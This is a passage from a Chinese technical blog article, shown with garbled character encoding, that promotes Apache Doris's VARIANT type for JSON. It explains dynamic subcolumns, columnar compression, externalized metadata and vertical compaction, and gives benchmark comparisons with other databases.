pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¤§æ•°æ®æ—¶ä»£ï¼ŒJSON å·²æˆä¸ºæ•°æ®äº¤æ¢çš„äº‹å®æ ‡å‡†ã€‚ä»æ—¥å¿—ã€åŸ‹ç‚¹åˆ° IoT è®¾å¤‡æ•°æ®ï¼Œä»ç”¨æˆ·ç”»åƒåˆ°å®æ—¶ç›‘æ§ï¼ŒJSON å‡­å€Ÿå…¶çµæ´»ã€å¯æ‰©å±•ã€æ— éœ€é¢„å®šä¹‰ Schema çš„ç‰¹æ€§ï¼Œå®Œç¾å¥‘åˆäº†å¿«é€Ÿè¿­ä»£çš„ç°ä»£ä¸šåŠ¡éœ€æ±‚ã€‚ç„¶è€Œï¼ŒJSON çš„åŠ¨æ€çµæ´»æ€§ä¸ä¼ ç»Ÿæ•°æ®åº“çš„é™æ€å¤„ç†æ¨¡å‹å­˜åœ¨æ ¹æœ¬çŸ›ç›¾ï¼Œè¿™ç›´æ¥å¯¼è‡´äº†æŸ¥è¯¢æ€§èƒ½ä½ä¸‹ã€Schema ç®¡ç†å¤æ‚ä»¥åŠåœ¨è¶…å®½è¡¨åœºæ™¯ä¸‹çš„æ‰©å±•æ€§å±æœºã€‚</p>
<p>å› æ­¤ï¼Œå¯¹äº JSON æ•°æ®çš„å¤„ç†ï¼Œç”¨æˆ·å¸¸å¸¸é™·å…¥ä¸¤éš¾æŠ‰æ‹©ï¼š</p>
<ul>
<li>ç‰ºç‰² æ€§èƒ½ æ¢å– çµæ´»æ€§ï¼ˆç”¨ JSON å­˜å‚¨ï¼Œæ‰¿æ‹…é«˜æ˜‚æŸ¥è¯¢å¼€é”€ï¼‰</li>
<li>ç‰ºç‰² çµæ´»æ€§ æ¢å– æ€§èƒ½ï¼ˆæå‰å»ºç«‹ Schemaï¼Œä¸§å¤±åŠ¨æ€å“åº”ä¸šåŠ¡å˜åŒ–èƒ½åŠ›ï¼‰</li>
</ul>
<p><strong>é‚£ä¹ˆï¼Œæ˜¯å¦å­˜åœ¨ä¸¤å…¨ä¹‹ç­–ï¼Œèƒ½è®©æ€§èƒ½ä¸çµæ´»æ€§å…¼å¾—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚</strong> Doris  <code>VARIANT</code>é€šè¿‡åº•å±‚çš„å­˜ç®—åˆ›æ–°ï¼Œå°†åŠç»“æ„åŒ–æ•°æ®çš„çµæ´»æ€§ä¸ç»“æ„åŒ–æ•°æ®çš„åˆ†ææ€§èƒ½å®Œç¾ç»“åˆï¼Œå…¨é¢è¶…è¶Šäº† Snowflakeã€ClickHouse ç­‰ä¼ ç»Ÿæ–¹æ¡ˆã€‚</p>
<p>å…·ä½“è€Œè¨€ï¼ŒDoris Variant å……åˆ†å‘æŒ¥åˆ—å­˜ä¸ç´¢å¼•ä¼˜åŠ¿ï¼Œé¿å…é¢‘ç¹è§£æå’Œå…¨é‡æ‰«æå¯¼è‡´ CPU ä¸ I/O è¿‡é«˜å¼•å‘æ€§èƒ½é—®é¢˜ã€‚æ­¤å¤–ï¼Œå®ƒèƒ½ä»å®¹åº”å¯¹å­—æ®µåŠ¨æ€å˜åŒ–åŠç±»å‹ä¸ä¸€è‡´åœºæ™¯ï¼Œç®€åŒ– Schema ç»´æŠ¤éš¾åº¦ï¼Œæ¶ˆé™¤äº†çµæ´»æ€§ä¸æ€§èƒ½é—´å†²çªã€‚åŒæ—¶ï¼ŒDoris ä¼˜åŒ–äº†è¶…å®½è¡¨ä¸­é”®å€¼ç¹å¤šã€ç¨€ç–åˆ†å¸ƒå¸¦æ¥çš„å­˜å‚¨ä¸ç´¢å¼•å¤æ‚æ€§ï¼Œè§£å†³è¶…å®½è¡¨åœºæ™¯ä¸‹æ‰©å±•æ€§é—®é¢˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2774fd14471d48f6b4eb799bfd035019~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=QpEVVyaNFjI9jDNL7rrs9nlJbx0%3D" alt="Doris ä¸å…¶ä»–äº§å“å¯¹æ¯”.png" loading="lazy"/></p>
<p>Doris <code>VARIANT</code> çš„å“è¶Šæ€§èƒ½ä¹Ÿåœ¨ä¸šç•Œå…¬å¼€çš„ JSONBench åŠç»“æ„åŒ–æ•°æ®æµ‹è¯•ä¸­å¾—åˆ°äº†å……åˆ†éªŒè¯ï¼š<strong>å†·æŸ¥è¯¢æ€§èƒ½æ’åç¬¬ä¸€ã€çƒ­æŸ¥è¯¢æ€§èƒ½ä½å±…ç¬¬äºŒï¼Œå…¨é¢é¢†å…ˆ ClickHouseã€Elasticsearch ç­‰ä¸€ä¼—çŸ¥åäº§å“ã€‚</strong> å…¶æŸ¥è¯¢é€Ÿåº¦çº¦æ˜¯ MongoDB çš„ <strong>164</strong> å€ã€PostgreSQL çš„ <strong>1074</strong> å€ã€‚æ­¤å¤–ï¼Œå¯¹ Dorisã€ Snowflake è¿›ä¸€æ­¥å¯¹æ¯”ï¼Œ ä¸ç®¡æ˜¯åœ¨å†·æŸ¥è¯¢è¿˜æ˜¯çƒ­æŸ¥è¯¢ä¸­ï¼ŒDoris ç›¸è¾ƒ Snowflake æœ‰çº¦ 2-5 å€çš„æ€§èƒ½ä¼˜åŠ¿ã€‚å…·ä½“å¯è§ä¸‹å›¾ï¼š</p>
<ul>
<li>ç™»é¡¶ JSONBench æ¦œå•</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b7c63612daf4c8797f801cbc3abf6e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=123BrIYuCShIpmOHXRa12NpPBuM%3D" alt="ç™»é¡¶ JSONBench æ¦œå•.PNG" loading="lazy"/></p>
<ul>
<li>Doris vs. Snowflake</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20f682f38d664db9881c0367832b7809~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=5I9Fdl6p9gSqR8Yap9wsS6QVkP4%3D" alt="Doris vs. Snowflake.PNG" loading="lazy"/></p>
<p><strong>Doris Variant èƒ½å¤Ÿå…·å¤‡ä¸Šè¿°ä¼˜åŠ¿ï¼Œä¸»è¦å¾—ç›Šäºä»¥ä¸‹è®¾è®¡å·§æ€åŠæŠ€æœ¯åˆ›æ–°ã€‚</strong></p>
<h2 data-id="heading-0">ä¸€ã€å¦‚ä½•è®© JSON è·å¾—åˆ—å­˜æ€§èƒ½ï¼Ÿ</h2>
<p>å®ç°åŠç»“æ„åŒ–æ•°æ®é«˜æ€§èƒ½åˆ†æçš„å‰ææ˜¯ï¼Œä½¿å…¶èƒ½å¤Ÿåƒå¤„ç†ç»“æ„åŒ–æ•°æ®ä¸€æ ·ï¼Œä¸ºå…¶æ„å»ºé«˜æ•ˆçš„åˆ—å¼å­˜å‚¨ç»“æ„ï¼Œè¿™æ˜¯åç»­é«˜æ€§èƒ½åˆ†æçš„åŸºç¡€ã€‚å› æ­¤ï¼Œ<strong>åœ¨ Doris ä¸­ï¼Œé€šè¿‡åŠ¨æ€å­åˆ—ã€å‹ç¼©ç®—æ³•ã€åˆ—è£å‰ªç­‰è®¾è®¡ï¼Œå°†åŠç»“æ„æ•°æ®è§„èŒƒåŒ–ï¼Œä»è€Œè·è·å¾—åˆ—å­˜çš„é«˜æ€§èƒ½ã€‚</strong></p>
<h3 data-id="heading-1">1.1  åŠ¨æ€å­åˆ—</h3>
<p>åœ¨å¦‚ Snowflake è¿™æ ·çš„ç³»ç»Ÿä¸­ï¼ŒJSON æ•°æ®çš„åº•å±‚å­˜å‚¨å¯¹ç”¨æˆ·è€Œè¨€æ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œéš¾ä»¥è¿›è¡ŒæŸ¥è¯¢ä¼˜åŒ–ã€æ— æ³•ä¿è¯æ€§èƒ½ã€‚è€Œåœ¨ Doris ä¸­ï¼Œå½“ JSON å¯¹è±¡å†™å…¥ VARIANT åˆ—æ—¶ï¼Œç³»ç»Ÿä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ul>
<li><strong>å­åˆ—ä¸ç±»å‹æ¨æ–­</strong>ï¼šè§£æ JSON çš„å±‚çº§ç»“æ„ï¼Œæå–å‡ºæ‰€æœ‰çš„ Key Pathï¼ˆå¦‚ <code>user.id</code>, <code>event.properties.timestamp</code>ï¼‰ï¼Œå¹¶è‡ªåŠ¨æ¨æ–­æ¯ä¸ªå­åˆ—çš„å€¼ç±»å‹ï¼ˆå¦‚ <code>BIGINT</code>, <code>DOUBLE</code>, <code>STRING</code> ç­‰ï¼‰ã€‚</li>
<li><strong>åŠ¨æ€åˆ—åŒ–ï¼ˆSubcolumnizationï¼‰</strong>ï¼š å¯¹äºé¢‘ç¹å‡ºç°çš„å­åˆ—ï¼Œå°†å…¶<strong>ç‰©åŒ–</strong>ä¸ºç‹¬ç«‹çš„å†…éƒ¨å­åˆ—ã€‚ä¾‹å¦‚ï¼ŒåµŒå¥—åœ¨ JSON ä¸­çš„ <code>user.id</code> å­—æ®µåœ¨ç‰©ç†å­˜å‚¨ä¸Šä¼šæ‹¥æœ‰ç‹¬ç«‹çš„ <code>BIGINT</code> åˆ—å¼å­˜å‚¨ç»“æ„ã€‚</li>
<li><strong>é€æ˜è®¿é—®</strong> ï¼šè¯¥è¿‡ç¨‹å¯¹ç”¨æˆ·å®Œå…¨é€æ˜ã€‚æ— éœ€é¢„å…ˆå®šä¹‰ Schemaï¼Œæ•°æ®å†™å…¥æ—¶è‡ªåŠ¨å®Œæˆåˆ—å¼è½¬æ¢ã€‚ç”¨æˆ·ä»å¯ä½¿ç”¨ <code>v['user']['id']</code>æŸ¥è¯¢ ï¼Œä½†æŸ¥è¯¢å¼•æ“å¯ä»¥ç›´æ¥è®¿é—®åˆ°å·²ç‰©åŒ–çš„ <code>user.id</code> å­åˆ—ï¼Œå……åˆ†åˆ©ç”¨åˆ—å­˜å’Œå‘é‡åŒ–æ‰§è¡Œçš„æ€§èƒ½ä¼˜åŠ¿ã€‚</li>
<li><strong>ç¨€ç–åˆ—</strong> ï¼šå¯¹äºå‡ºç°é¢‘ç‡æä½æˆ–ç»“æ„å¤æ‚çš„ç¨€ç–å­åˆ—ï¼Œä¸ä¸ºå…¶åˆ›å»ºç‹¬ç«‹å­åˆ—ä»¥é¿å…åˆ—çˆ†ç‚¸ã€‚ç›¸åï¼Œè¿™äº›æ•°æ®ä¼šè¢«é«˜æ•ˆç»„ç»‡åœ¨ä¸€ä¸ªç±» JSONB çš„äºŒè¿›åˆ¶â€œç¨€ç–â€åˆ—ä¸­ï¼Œä¿ç•™å®Œæ•´æ•°æ®è€Œä¸ä¸ºç½•è§å­—æ®µé¢å¤–å»ºåˆ—ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8cc9776671c46bc8803f7e3a8e034ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=RXHijSljh%2Fz5WUC5whwM5wRodXY%3D" alt="åŠ¨æ€å­åˆ—.png" loading="lazy"/></p>
<p><strong>é€šè¿‡è¿™ä¸€æœºåˆ¶ï¼ŒDoris åœ¨æ•°æ®å†™å…¥é˜¶æ®µå°±å®Œæˆäº†ä»åŠç»“æ„åŒ–åˆ°å‡†ç»“æ„åŒ–çš„è½¬æ¢ï¼Œä¸ºé«˜æ€§èƒ½åˆ†æå¥ å®šäº†åŸºç¡€ã€‚</strong></p>
<h3 data-id="heading-2">1.2 åˆ—å¼å­˜å‚¨</h3>
<p>åœ¨åŠ¨æ€å­åˆ—çš„åŸºç¡€ä¸Šï¼ŒDoris è¿›ä¸€æ­¥è¿ç”¨æˆç†Ÿçš„åˆ—å¼å­˜å‚¨æŠ€æœ¯ï¼Œå®ç°å­˜å‚¨ä¸ I/O æ•ˆç‡çš„å€å¢ã€‚</p>
<ul>
<li><strong>å‹ç¼©</strong>ï¼š Doris ä¼šæ ¹æ®å­åˆ—çš„æ•°æ®åˆ†å¸ƒè‡ªåŠ¨æŒ‘é€‰å‹ç¼©ç®—æ³•ï¼Œä¾‹å¦‚æšä¸¾å‹å­—æ®µä½¿ç”¨å­—å…¸ç¼–ç ã€è¿ç»­æ•°å€¼ç”¨ RLEï¼Œä»è€Œå®ç°æ›´ç´§å‡‘çš„å­˜å‚¨å¹¶é™ä½è¯»å–æˆæœ¬ã€‚</li>
<li><strong>å­åˆ—çº§ I/O ï¼ˆåˆ—è£å‰ªï¼‰</strong>ï¼šæŸ¥è¯¢åªè¯»å–å®é™…éœ€è¦çš„å­—æ®µï¼Œæ¶ˆé™¤äº†è¿‡å»æ•´å— JSON æ‹‰å…¥å†è§£æçš„æ–¹å¼ã€‚é€šè¿‡ Path çº§åˆ«åˆ—è£å‰ªå’Œå»¶è¿Ÿç‰©åŒ–æœºåˆ¶ï¼Œä»…åŠ è½½å¿…éœ€çš„ JSON å­åˆ—æ•°æ®ï¼Œæœ‰æ•ˆå‡å°‘äº†æ•°æ®è¯»å–çš„æ”¾å¤§é—®é¢˜ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0873a066f5b7489fb94b56bcd7735382~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=wb1E4Rt1UmopJGsL9Onc7h%2BvA74%3D" alt="åˆ—å¼å­˜å‚¨.png" loading="lazy"/></p>
<p>é€šè¿‡ä»¥ä¸Šç­–ç•¥ï¼Œ<strong>Doris è§£å†³ä¼ ç»Ÿç³»ç»Ÿä¸­ JSON æŸ¥è¯¢çš„æ…¢å’Œé‡é—®é¢˜ï¼ŒæˆåŠŸåœ°å°† JSON æ•°æ®çš„çµæ´»æ€§ä¸åˆ—å¼å­˜å‚¨çš„é«˜æ€§èƒ½ç›¸ç»“åˆï¼Œå®ç°äº†åŠç»“æ„åŒ–æ•°æ®çš„é«˜æ•ˆåˆ†æã€‚</strong> è¿™ç§æ–¹æ³•ä¸ä»…æé«˜äº†æŸ¥è¯¢æ€§èƒ½ï¼Œè¿˜ç®€åŒ–äº† Schema ç®¡ç†ï¼Œä¸ºç”¨æˆ·å¸¦æ¥æ˜¾è‘—çš„ä½¿ç”¨ä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-3">1.3 åƒåˆ—çº§å­˜å‚¨çš„æ€§èƒ½è·ƒå‡</h3>
<p>ç„¶åï¼Œå½“æ•°æ®æ¨¡å‹ä»å®½è¿›ä¸€æ­¥æ¼”åŒ–ä¸ºè¶…å®½æ—¶ï¼Œæ–°çš„æŒ‘æˆ˜ä¹Ÿéšä¹‹è€Œæ¥ã€‚å› æ­¤ Doris Variant æŒç»­ä¼˜åŒ–ï¼Œä½¿å…¶èƒ½å¤Ÿä»å®¹é¢å¯¹<strong>å…ƒæ•°æ®è†¨èƒ€ä¸åˆå¹¶ï¼ˆCompactionï¼‰å¼€é”€å·¨å¤§çš„é—®é¢˜ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abce2ed23cb445ad89a614589e1e7386~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=ITIV6DriPkZamd24JcHMi9aFbgQ%3D" alt="1.3 åƒåˆ—çº§å­˜å‚¨çš„æ€§èƒ½è·ƒå‡.png" loading="lazy"/></p>
<h4 data-id="heading-4">1.3.1 å…ƒæ•°æ®å­˜å‚¨ä¼˜åŒ–</h4>
<p>åœ¨æ—¥å¿—åˆ†æã€ç”¨æˆ·ç”»åƒç­‰è¶…å®½è¡¨åœºæ™¯ä¸­ï¼Œå•è¡¨å¸¸æ¶‰åŠä¸Šåƒä¸ªåˆ—ï¼ˆåˆ—å­˜ï¼‰ã€‚å³ä¾¿æŸ¥è¯¢ä»…éœ€è®¿é—®å…¶ä¸­å‡ åˆ—ï¼Œä¹Ÿéœ€å°†åŒ…å«æ‰€æœ‰åˆ—å…ƒæ•°æ®çš„åºå¤§ Footer å®Œæ•´åŠ è½½è‡³å†…å­˜å¹¶è§£æï¼Œå†…å­˜å’Œååºåˆ—åŒ–æˆæœ¬æ€¥å‰§è†¨èƒ€ï¼Œå¯¼è‡´ä¸¥é‡çš„ I/O ä¸å†…å­˜å¼€é”€ã€‚</p>
<p>ä¸ºæ­¤ï¼ŒDoris åœ¨ Segment æ–‡ä»¶æ ¼å¼å±‚è¿›è¡Œäº†å…³é”®ä¼˜åŒ–ï¼šå°†åˆ—å…ƒæ•°æ®ä» Footer ä¸­å‰¥ç¦»ï¼Œç‹¬ç«‹å­˜å‚¨äºä¸“ç”¨çš„æ•°æ®é¡µï¼ˆå¯ç†è§£ä¸ºå…ƒæ•°æ®ç´¢å¼•é¡µï¼‰ä¸­ï¼ŒFooter ä»…ä¿ç•™æŒ‡å‘è¯¥é¡µçš„è½»é‡æŒ‡é’ˆã€‚è¯»å–æ—¶å…ˆåŠ è½½ç²¾ç®€ Footerï¼Œå†æŒ‰éœ€å®šä½å¹¶åŠ è½½æ‰€éœ€åˆ—å…ƒæ•°æ®ã€‚è¿™ç§ <strong>Externalize Meta</strong> çš„è®¾è®¡ï¼Œä»æ ¹æœ¬ä¸Šé¿å…äº†å®½è¡¨åœºæ™¯ä¸‹çš„å…ƒæ•°æ®è†¨èƒ€é—®é¢˜ï¼Œä½¿åˆ—è£å‰ªå§‹ç»ˆä¿æŒé«˜æ•ˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a1cc33cccf24b5c838a90186f877723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=V%2FstrAJaah22%2BgCcoBBeeUjWtUo%3D" alt="1.3.1 å…ƒæ•°æ®å­˜å‚¨ä¼˜åŒ–.png" loading="lazy"/></p>
<p>ä»¥ä¸‹æ˜¯å…³äº VARIANT å…ƒæ•°æ®æ‰“å¼€æ•ˆç‡çš„æµ‹è¯•å¯¹æ¯”ï¼ˆç¯å¢ƒè®¾ç½®åŒ…å« 10,000 ä¸ª Segmentï¼Œæ¯ä¸ª Segment æ‹¥æœ‰ 7,000 ä¸ª JSON Pathï¼Œä¸”å‡å·²ç‰©åŒ–ä¸ºå­åˆ—ï¼‰ï¼š</p>
<ul>
<li>ä¼˜åŒ–å‰ï¼šéœ€è¦è§£æå·¨å¤§ Footerï¼ˆåŒ…å«æ‰€æœ‰åˆ—çš„ ColumnMetaï¼‰ï¼Œå¯¼è‡´å¤§é‡æ— æ•ˆçš„ I/O æ“ä½œã€ååºåˆ—åŒ–å’Œå†…å­˜è†¨èƒ€ï¼ŒI/O æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</li>
<li>ä¼˜åŒ–åï¼šé¦–å…ˆè¯»å–å°å‹ Footerï¼ˆä»…åŒ…å« PagePointerï¼‰ï¼Œç„¶åæŒ‰éœ€åŠ è½½è¢«è®¿é—®åˆ—çš„å…ƒæ•°æ®ï¼Œé¿å…å…¨é‡è§£æã€‚<strong>æ‰“å¼€é€Ÿåº¦ä» 65s ç¼©å‡è‡³ 4sï¼Œæ•ˆç‡æå‡çº¦ 16 å€ï¼›å†…å­˜ä» 60GB ç¼©å‡è‡³å°äº 1GBã€‚</strong></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc88d4561b084c9b9d4ae8a8d22c07c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=BMaqRHlbPFK7UM6qd7LNLPliZmI%3D" alt="1.3.1 å…ƒæ•°æ®å­˜å‚¨ä¼˜åŒ–-1.png" loading="lazy"/></p>
<h4 data-id="heading-5">1.3.2 Vertical Compaction</h4>
<p>åœ¨è¶…å®½è¡¨åœºæ™¯ä¸­ï¼Œæ•°æ®åˆå¹¶ï¼ˆCompactionï¼‰ä¸€ç›´æ˜¯æœ€æ£˜æ‰‹çš„ç¯èŠ‚ã€‚éšç€è¡¨ä¸­åˆ—æ•°è¾¾åˆ°ä¸Šåƒç”šè‡³ä¸Šä¸‡ï¼Œä¼ ç»Ÿåˆå¹¶ç­–ç•¥ä¼šæš´éœ²å‡ºä¸¤ä¸ªä¸»è¦é—®é¢˜ï¼šé¦–å…ˆï¼Œæ¯æ¬¡åˆå¹¶éƒ½éœ€æ‰«æå¹¶é‡å†™æ‰€æœ‰åˆ—ï¼Œå³ä½¿ç»å¤§å¤šæ•°å­—æ®µå¹¶æœªæ›´æ–°ï¼›å…¶æ¬¡ï¼Œåˆ—å…ƒæ•°æ®å’Œ Segment æ–‡ä»¶ä½“ç§¯åºå¤§ï¼Œå¯¼è‡´åˆå¹¶çš„ I/O æˆæœ¬å’Œå†…å­˜æ¶ˆè€—å¤§å¹…å¢åŠ ã€‚</p>
<p>ä¸ºæ­¤ï¼ŒDoris Variant å¼•å…¥å­åˆ—çº§ Vertical Compactionï¼Œå°†å•æ¬¡ Compaction æ‹†åˆ†ä¸ºæŒ‰åˆ—åˆ†ç»„çš„å¤šè½®åˆå¹¶ã€‚æ¯è½®ä»…åŠ è½½éƒ¨åˆ†åˆ—ç»„ï¼ˆå¦‚ 10 åˆ—ï¼‰ï¼Œé€æ­¥å®Œæˆå…¨é‡åˆå¹¶ã€‚æ­¤ä¸¾å¸¦æ¥ä¸¤å¤§æ ¸å¿ƒæ”¹è¿›ï¼š</p>
<ul>
<li><strong>å†…å­˜å³°å€¼æ˜¾è‘—é™ä½</strong>ï¼šæ¯è½®åªéœ€æŒæœ‰éƒ¨åˆ†åˆ—çš„ä¸­é—´æ•°æ®ï¼Œé¿å…äº†å…¨åˆ—å¹¶å‘åˆå¹¶å¸¦æ¥çš„å†…å­˜ç¬æ—¶æ¿€å¢ï¼›</li>
<li><strong>I/O è®¿é—®æ›´åŠ å¯æ§</strong>ï¼šæ›´ç»†ç²’åº¦çš„åˆ—ç»„å¤„ç†ï¼Œå¯ä»¥æ›´å¥½ä¸ç£ç›˜è°ƒåº¦ã€åå°åˆ·å†™å¹¶è¡ŒåŒ–é…åˆã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a52191afba441339975a80e9beaa28f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=%2B0NN7fFQiIfW1HeN7b%2BTNFdt1C4%3D" alt="1.3.2 Vertical Compaction.png" loading="lazy"/></p>
<p>å®æµ‹ç»“æœæ˜¾ç¤ºï¼Œåœ¨è¡¨ç»“æ„ä¸­åˆ—æ•°è¶…è¿‡ 1,000 æ—¶ï¼Œ<strong>å¼€å¯ Vertical Compaction åï¼Œå•æ¬¡åˆå¹¶çš„å†…å­˜å ç”¨ä»çº¦ 50 GB é™è‡³ 2 GB å·¦å³ï¼Œé™ä½è¿‘ 25 å€ï¼›åŒæ—¶ï¼Œæ•´ä½“ååé‡å‡ ä¹æœªå—å½±å“</strong>ã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒVertical Compaction ä½¿ VARIANT ä¸å†åªæ˜¯èƒ½å­˜ JSONï¼Œè¿˜èƒ½åœ¨åŠ¨æ€ Schema çš„è¶…å®½è¡¨æ¨¡å‹ä¸­å®ç°é•¿æœŸç¨³å®šçš„è¿è¡Œâ€”â€”è¿™æ˜¯å¤§å¤šæ•°åˆ—å¼å¼•æ“çš„è–„å¼±ç¯èŠ‚ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4a2e468af6e418e9921aa344d5f3fca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2VsZWN0REI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=c2jerNavo3jyY2UJKMOvO2v6a6s%3D" alt="1.3.2 Vertical Compaction-1.png" loading="lazy"/></p>
<h2 data-id="heading-6">äºŒã€ å…¼å¤‡ç»“æ„åŒ–æŸ¥è¯¢ä¸å…¨æ–‡æ£€ç´¢</h2>
<p>åŠ¨æ€å­åˆ—è§£å†³äº† JSON åœ¨å¤§è§„æ¨¡æ‰«æä¸èšåˆåœºæ™¯ä¸‹çš„æ€§èƒ½ç“¶é¢ˆï¼Œè€Œ Doris è¿›ä¸€æ­¥ä¸ºå…¶æ„å»ºäº†é«˜åº¦å¯å®šåˆ¶çš„ç´¢å¼•æœºåˆ¶ï¼Œä½¿å…¶åœ¨ç‚¹æŸ¥è¯¢ä¸æ–‡æœ¬æ£€ç´¢åœºæ™¯ä¸‹ä¹Ÿå…·å¤‡æé€Ÿå“åº”çš„èƒ½åŠ›ã€‚è®¾è®¡å€Ÿé‰´äº† Elasticsearch <code>dynamic mapping</code> çš„æ€æƒ³ï¼Œå¯æä¾›å¼€ç®±å³ç”¨çš„é«˜æ€§èƒ½ç´¢å¼•èƒ½åŠ›ã€‚</p>
